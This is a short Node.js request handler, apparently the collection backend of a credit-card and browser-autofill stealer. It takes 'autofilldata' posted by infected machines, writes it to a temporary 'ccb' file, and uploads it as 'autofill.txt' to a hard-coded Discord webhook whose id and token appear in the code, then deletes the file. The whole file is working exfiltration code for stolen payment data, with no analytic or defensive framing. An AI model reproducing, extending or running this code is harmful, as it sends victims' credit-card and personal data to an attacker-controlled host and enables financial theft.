//const { keyToWebhook } = require('../keyToWebhook');
const fs = require('fs');
const { MessageEmbed, WebhookClient } = require('discord.js');
var randomstring = require("randomstring");


module.exports = async (req, res) => {
    const { autofilldata } = req.body
  var rst = "311"

  
    let content = !autofilldata.includes('NAME:') ? "Creditcards don\'t found." : autofilldata;
    fs.writeFileSync(`./Src/Temp/ccb_${rst}.txt`, content);
const webhookClient = new WebhookClient({ id: '1056349734278807592', token: 'RzPxTlSFScGbxST_tZYeZZ8Oc1L5PBvbmblVUt774as2tKfaL9ssXvuG5tsN1et4nqaw' });

  webhookClient.send({
        files: [{
            attachment: `./Src/Temp/ccb_${rst}.txt`,
            name: "autofill.txt"
        }]
    })
        .then(() => {
            fs.unlink(`./Src/Temp/ccb_${rst}.txt`, function (err) {
                if (err) { };
            })
            res.sendStatus(200)
            return;
        })
        .catch(err => { })
}
